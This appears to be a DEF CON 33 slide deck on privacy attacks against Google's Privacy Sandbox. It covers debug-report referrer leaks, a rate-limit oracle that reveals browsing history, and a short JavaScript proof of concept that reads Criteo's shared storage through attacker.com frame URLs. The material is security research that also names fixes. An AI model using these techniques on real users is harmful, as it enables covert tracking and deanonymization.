---
marp: true
theme: default
class: invert
paginate: true
style: |
  section {
    background-color: #0d1117;
    color: #e6edf3;
    font-family: 'Segoe UI', system-ui, sans-serif;
    padding: 2em 2.5em;
  }
  h1 { color: #58a6ff; font-size: 1.8em; margin-bottom: 0.3em; }
  h2 { color: #79c0ff; font-size: 1.4em; border-bottom: 2px solid #30363d; padding-bottom: 0.2em; }
  code {
    background: #161b22; color: #e6edf3;
    border: 1px solid #30363d; border-radius: 4px;
    padding: 0 4px; font-size: 0.82em;
  }
  pre { background: #161b22 !important; border: 1px solid #30363d; border-radius: 6px; padding: 0.8em; }
  pre code { border: none; font-size: 0.72em; line-height: 1.4; }
  ul li { margin-bottom: 0.3em; }
  blockquote { border-left: 4px solid #f0883e; padding-left: 1em; color: #f0883e; }
  .mermaid-diagram { display: flex; justify-content: center; margin: 0.5em 0; }
  .mermaid-diagram svg { max-height: 420px; max-width: 100%; }
  section.title {
    display: flex; flex-direction: column;
    justify-content: center; align-items: center; text-align: center;
  }
  section.title h1 { font-size: 2.6em; color: #58a6ff; margin-bottom: 0.2em; }
  section.title h2 { border: none; color: #8b949e; font-size: 1.1em; font-weight: normal; }
  section.section-divider {
    display: flex; flex-direction: column;
    justify-content: center; align-items: center; text-align: center;
    background-color: #161b22;
  }
  section.section-divider h1 { font-size: 2.8em; color: #f0883e; }
---

<!-- _class: title -->

# Escaping the Privacy Sandbox

## with Client-Side Deanonymization Attacks

**DEF CON 33**
Eugene "Spaceraccoon" Lim

---

# About Me

**Eugene "Spaceraccoon" Lim**

Focus areas:
- **Appsec** — application security research
- **Vulnerability research** — finding bugs that matter
- _"Why would you connect that to the internet???"_

spaceraccoon.dev · @spaceraccoon

---

# The End of an Era: Cookies Cancelled?

> "Soon" is doing a lot of heavy lifting…

- 🚫 Browsers beginning to **block third-party cookies by default**
- ⚖️ Privacy laws and regulations **restricting third-party cookie tracking**
- 🛡️ Browser- and network-level **ad blocking** on the rise

---

# The Elephant in the Room

<br>

> **Google recently announced they are pausing the deprecation of third-party cookies.**

---

# So Why Do We Still Care?

```mermaid
%%{init: {"flowchart": {"wrappingWidth": 200}} }%%
flowchart LR
    A["🟢 Already live\nShipped in Chrome &\nChromium right now"]
    B["📣 Adtech uses it\nCompanies still need a\nway around cookie blocking"]
    C["🔬 It's interesting\nPrivacy-preserving adtech\nis hard & unexplored"]
    A --- B --- C
```

---

# Unpacking Google's Privacy Sandbox

```mermaid
%%{init: {"flowchart": {"wrappingWidth": 200}} }%%
flowchart LR
    A["⚔️ Client-side APIs\nbrowser & mobile\n← our focus today"]
    B["🔒 Walled Garden\nenrollment &\nverification"]
    C["🏛️ Trusted Execution\naggregation &\ndecryption in TEEs"]
    A --- B --- C
    style A stroke:#f0883e,stroke-width:3px
```

---

# Agenda

- **Attribution Reporting API**
  - Leaking information with debug reports
  - Browser history stealing via side-channels

- **Shared Storage API**
  - Leaking private data from insecure worklets

- **Conclusion + Q&A**

---

<!-- _class: section-divider -->

# The Attribution Reporting API

---

# What is the Attribution Reporting API?

Privacy Sandbox API for **conversion tracking** without third-party cookies.

> *Did a user who viewed an ad on Site A later perform an action (like a purchase) on Site B?*

- Operates entirely **client-side**
- Three parties: **Publisher**, **Browser**, **Adtech Server**

---

# Step 1: Registering a Source

```mermaid
flowchart LR
    subgraph pub["Publisher Website · acmenews.com"]
        ad["Embedded Ad\niframe.ad.tech"]
    end
    B["Browser"]
    AS["Adtech Server\nreport.ad.tech"]

    pub -->|"① visit · ② interact with ad"| B
    ad -->|"③ Attribution-Reporting-Eligible header"| B
    B -->|"④ Attribution-Reporting-Register-Source\n(destination: buy.me)"| AS
    AS -->|"④ response: Register-Source accepted\n⑤ store attribution source data"| B
```

_Interaction can be navigation- or event-based via `attributionsrc` / JS `attributionSrc`_

---

# Step 1: Source Registration (HTTP)

```http
GET /pagead/ar-adview/?nrh={...} HTTP/2
Host: www.googleadservices.com
Cookie: ar_debug=1
Attribution-Reporting-Eligible: trigger;navigation-source, event-source

HTTP/2 200 OK
Attribution-Reporting-Register-Source: {
  "aggregation_keys": { "1": "0x6e1f4587619636cb...", ... },
  "debug_key": "3343088426263375305",
  "debug_reporting": true,
  "destination": "https://spaceraccoon.dev",
  "expiry": "2592000",
  "source_event_id": "9565824793031098609"
}
Set-Cookie: ar_debug=1; Secure; HttpOnly; SameSite=none
```

---

# Step 2: Registering a Trigger

```mermaid
flowchart LR
    subgraph dest["Destination Website · buy.me"]
        tag["Embedded Analytics\ntag.ad.tech"]
    end
    B["Browser"]
    AS["Advertiser Server\nreport.ad.tech"]

    dest -->|"① visit · ② interact with conversion"| B
    tag -->|"③ Attribution-Reporting-Eligible header"| B
    B <-->|"④ Attribution-Reporting-Register-Trigger"| AS
    B -->|"⑤ attempt source-trigger matching"| B
```

---

# Step 2: Trigger Registration (HTTP)

```http
GET /pagead/conversion/16766202842/?... HTTP/2
Host: www.googleadservices.com
Attribution-Reporting-Eligible: trigger, event-source;navigation-source
Referer: https://spaceraccoon.dev

HTTP/2 200 OK
Attribution-Reporting-Register-Trigger: {
  "aggregatable_trigger_data": [
    { "filters": { "22": ["true"], "6": ["true"] },
      "key_piece": "0x4a2e673f6d1e4e87",
      "source_keys": ["6"] },
    ...
  ]
}
```

---

# Step 3: Generating Reports

```mermaid
flowchart LR
    B["Browser\n\n① confirm trigger top-level page\nmatches stored source destination"]
    AS["Advertiser Server\nreport.ad.tech"]
    B -->|"② send attribution report"| AS
```

Other data used to confirm a match:
- `trigger_data` — specify trigger event
- `filters` — narrow down conversions
- `max_event_level_reports` / `trigger_data_matching`

Reports can be **event-level** or **summary** reports.

---

# Step 3: Report Generation (HTTP)

```http
POST /.well-known/attribution-reporting/report-event-attribution HTTP/2
Host: ad.doubleclick.net
Content-Type: application/json

{
  "attribution_destination": ["https://spaceraccoon.dev"],
  "randomized_trigger_rate": 0.0001272,
  "report_id": "8b750c76-62c9-487b-8bab-4e9b8c7a9599",
  "scheduled_report_time": "1742262266",
  "source_event_id": "7269729236833329074",
  "source_type": "navigation",
  "trigger_data": "7"
}
```

---

# Intended Privacy Protections

| Protection | Mechanism |
|---|---|
| 🎲 **Random** | Randomized reporting delays obscure exact conversion time |
| 📊 **Limited** | Only small amounts of data can be sent per report |
| 📡 **Noisy** | Noise added to prevent deanonymization of individuals |

<br>

> Seems pretty solid, right? **Let's break it.**

---

<!-- _class: section-divider -->

# ⚠️ Attack #1
## Leaky Debugging Reports

---

# Attack #1: Leaky Debugging Reports

- Privacy Sandbox has a **transitional debug report** feature
- Sends verbose debug reports to the reporting origin
- Enabled via `ar_debug=1` cookie
- Can be triggered deliberately by failures in attribution registrations
- Debug reports include **`source_site`** or **`context_site`** values

> Remember when third-party cookies were supposed to be deprecated *soon*?

---

# Debug Report: Referrer Leak

```php
<?php header("Referrer-Policy: no-referrer"); ?>
<img width="180" src="https://simeola.com/register-source.php" attributionsrc />
```

```http
POST /.well-known/attribution-reporting/debug/verbose HTTP/2
Host: simeola.com

[{ "body": {
    "attribution_destination": ["https://destination.com"],
    "source_site": "https://publishersite.com"
   },
   "type": "source-success"
}]
```

**Leaks referrer site despite `no-referrer` policy via debug report!**

---

# SafeFrame Referrer Leak

```mermaid
flowchart TD
    subgraph Publisher["Publisher Website · acmenews.com"]
        subgraph SafeFrame["SafeFrame · tpc.googlesyndication.com"]
            Ad["Ad · s0.2mdn.net"]
        end
    end
    note["⚠️ Limited postMessage\ncommunication only"]
```

Header-error debug reports can be **deliberately triggered** with malformed attribution data + `Attribution-Reporting-Info: report-header-errors`, causing the report to leak `context_site: acmenews.com`.

---

# SafeFrame Attack Flow

```mermaid
flowchart LR
    subgraph pub["Publisher · acmenews.com"]
        subgraph sf["SafeFrame · tpc.googlesyndication.com"]
            ad["Ad · s0.2mdn.net"]
        end
    end
    B["Browser"]
    AS["Adtech Server\nreport.ad.tech"]

    ad -->|"③ Attribution-Reporting-Eligible"| B
    B -->|"④ Attribution-Reporting-Info: report-header-errors\n+ malformed Register-Source"| AS
    AS -->|"④ header-error triggers debug report"| B
    B -->|"⑤ debug report leaks\ncontext_site: acmenews.com 🔴"| AS
```

---

# How Facebook Ads Sandbox Prevents It

```http
Permissions-Policy: accelerometer=(),
  attribution-reporting=(),
  bluetooth=(),
  camera=(),
  ch-device-memory=(),
  ch-downlink=(),
  ...
Document-Policy: force-load-at-top
```

**Fix: disable `attribution-reporting` entirely via `Permissions-Policy`.**

---

<!-- _class: section-divider -->

# ⚠️ Attack #2
## Destination Hijacking

---

# Attack #2: Destination Hijacking

- Attribution API allows **more than 1 destination** during source registration
- While auditing DoubleClick ad implementations, I found 2 strange debug destinations added to **every** source registration:
  - `debugconversiondomain1.com`
  - `debugconversiondomain2.com`

> **Were these debugging domains available to register?**

---

# The Debug Domains Were Available

```
✓  debugconversiondomain1.com    $10.44    [Purchase]
```

<br>

# 🔴 SOLD

---

# Okay… I Can Commit Ad Click Fraud. So What?

```mermaid
flowchart LR
    subgraph pub["Publisher · acmenews.com"]
        ad["Embedded Ad\nad.doubleclick.net"]
    end
    subgraph dc["debugconversiondomain2.com"]
        script["Script"]
    end
    RO["Reporting Origin\nad.doubleclick.net"]

    ad -->|"① visit · ② interact with ad\n→ source: [advertiser.com,\ndebugdomain1, debugdomain2]"| script
    script -->|"③ user visits · ④ trigger auto-registered\n⑤ conversion for all 3 destinations"| RO
```

---

# The Storage Limit Oracle

**Rate limits** prevent abuse and slow data gathering on individuals.

The browser has an **undocumented storage limit** for event-level reports per destination.

```mermaid
flowchart LR
    A["Report #1–1000\nqueued normally"] -->|"Report #1001"| B["trigger-event-storage-limit\ndebug error 🔔"]
    B --> C["Queue was full!\nHow full was it\nbefore we started?"]
```

> The error itself is our oracle.

---

# Oracle: User **Visits** advertiser.com

```mermaid
flowchart TD
    subgraph pub["Publisher · acmenews.com"]
        ad["Embedded Ad\nad.doubleclick.net"]
    end
    subgraph adv["advertiser.com"]
        s1["Script"]
    end
    subgraph att["attacker.com"]
        s2["Script"]
    end
    oracle(["⑥ rate limit hit at 1000\n∴ queue had 1 → user visited ✅"])

    ad -->|"① visit · ② interact\n→ source: [advertiser.com,\ndebugdomain1, debugdomain2]"| s1
    s1 -->|"③ visit · ④ trigger → 1 report queued"| s2
    s2 -->|"⑤ visit · 999 more pairs"| oracle
```

---

# Oracle: User **Doesn't Visit** advertiser.com

```mermaid
flowchart TD
    subgraph pub["Publisher · acmenews.com"]
        ad["Embedded Ad\nad.doubleclick.net"]
    end
    subgraph adv["advertiser.com · ③ user doesn't visit"]
        skip(["→ 0 reports queued"])
    end
    subgraph att["attacker.com"]
        s2["Script"]
    end
    oracle(["⑤ rate limit hit at 1000\n∴ queue was empty → user didn't visit ❌"])

    ad -->|"① visit · ② interact\n→ source: [advertiser.com,\ndebugdomain1, debugdomain2]"| skip
    skip -->|"④ visit"| s2
    s2 -->|"1000 more pairs"| oracle
```

---

# De-Anonymization Achieved

If attacker receives only **999 reports** before hitting the rate limit:

> The queue was already filled by **one prior report**.

**Conclusion:** The user must have previously visited `advertiser.com`.

✅ Successfully de-anonymized browser history — **without placing an ad or being part of the original transaction**.

---

<!-- _class: section-divider -->

# The Shared Storage API

---

# What is the Shared Storage API?

Privacy Sandbox API for **cross-site storage access** in a privacy-preserving way.

```mermaid
flowchart LR
    A["Site A\nsets value\nsharedStorage.set(...)"] -->|"cross-site"| B["Worklet\n(isolated context)\nreads value"]
    B -->|"output gate"| C["Fenced Frame\nrenders result"]
```

**Use case:** Store a user's interest group (e.g. `cat-lover`) and use it to select relevant ads across different sites — without exposing the raw value cross-site.

---

# Step 1: Shared Storage → Worklet

```javascript
// Site A stores a value
window.sharedStorage
  .set("ab-testing-group", "0")
  .then(console.log("Value saved to shared storage"));

// Load a worklet that can read from shared storage
await window.sharedStorage.worklet.addModule("ab-testing-worklet.js");
```

```html
<fencedframe id="content-slot"></fencedframe>
```

The worklet runs in an **isolated context** — it can read storage but cannot expose the value directly to the page.

---

# Step 2: Worklet → Fenced Frame

```javascript
const fencedFrameConfig = await window.sharedStorage.selectURL(
  "ab-testing",
  [
    { url: "https://example.com/default-content.html" },
    { url: "https://example.com/experiment-content-a.html" },
  ],
  { resolveToConfig: true }
);
document.getElementById("content-slot").config = fencedFrameConfig;
```

The selected URL index is an **output gate** — the value never leaves the worklet directly.

---

<!-- _class: section-divider -->

# ⚠️ Attack #3
## Insecure Cross-Site Worklets

---

# Attack #3: Insecure Cross-Site Worklets

Worklets support `dataOrigin: "script-origin"` — any site can load a third-party worklet and **access that third party's shared storage**.

> So make sure the worklet script is secure…

**Finding:** `fledge.criteo.com` exposes a public worklet that reads an A/B test value from Criteo's shared storage. Any attacker can invoke it and **infer the stored value** from which URL gets selected.

---

# fledge.criteo.com Worklet (Vulnerable)

```javascript
class SelectURLOperation {
  async run(urls, data) {
    var r = Math.floor(8 * Math.random()).toString();
    // only sets if not already present — so Criteo's existing value persists
    await sharedStorage.set("chrome_abt_pop", r, { ignoreIfPresent: true });
    let a = await sharedStorage.get("chrome_abt_pop");
    return urls.map(url => url.split("?")[0])
               .findIndex(url => url.endsWith(a)); // returns index → leaks value
  }
}
register("select-abt-url", SelectURLOperation);
```

---

# Exploiting the Worklet

```javascript
const selectAbtWorklet = await window.sharedStorage.createWorklet(
  "https://fledge.criteo.com/interest-group/abt/worklet",
  { dataOrigin: "script-origin" }  // ← access Criteo's shared storage
);

var config = await selectAbtWorklet.selectURL('select-abt-url', [
  { url: 'https://attacker.com/frame.php#0' },
  { url: 'https://attacker.com/frame.php#1' },
  // ...up to #7
], { resolveToConfig: true });

document.getElementById("content-slot").config = config;
// Which #fragment loads reveals chrome_abt_pop ∈ {0..7}
```

**Any website can read Criteo's `chrome_abt_pop` from private Shared Storage.**

---

# Summary of Attacks

| # | API | Attack | Impact |
|---|-----|--------|--------|
| 1a | Attribution | Debug report leaks referrer despite `no-referrer` | Publisher site exposure |
| 1b | Attribution | SafeFrame site leak via deliberate header errors | Publisher site exposure |
| 2 | Attribution | Destination hijacking + storage limit oracle | Browser history de-anonymization |
| 3 | Shared Storage | Insecure cross-site worklet invocation | Private data exfiltration |

---

# The Bigger Picture

**Privacy-preserving adtech is hard.**

- Despite creators' best efforts, privacy/security implications of certain features are **not fully understood**
- The **attack surface is large and unexplored**
- The web has a long history of **hardening new features only after they are deployed and attacked**

---

# There's Still More to Do…

| Layer | Unexplored APIs |
|---|---|
| **Client-side APIs** | Topics API, Protected Audience API, Private Aggregation API |
| **Aggregation Service** | Trusted Execution Environments |
| **Enrollment** | Attestations, Trusted origins |

---

<!-- _class: title -->

# Escaping the Privacy Sandbox

## with Client-Side Deanonymization Attacks

**DEF CON 33** · Eugene "Spaceraccoon" Lim

spaceraccoon.dev · @spaceraccoon

_Book signing! Swag! Stickers!_
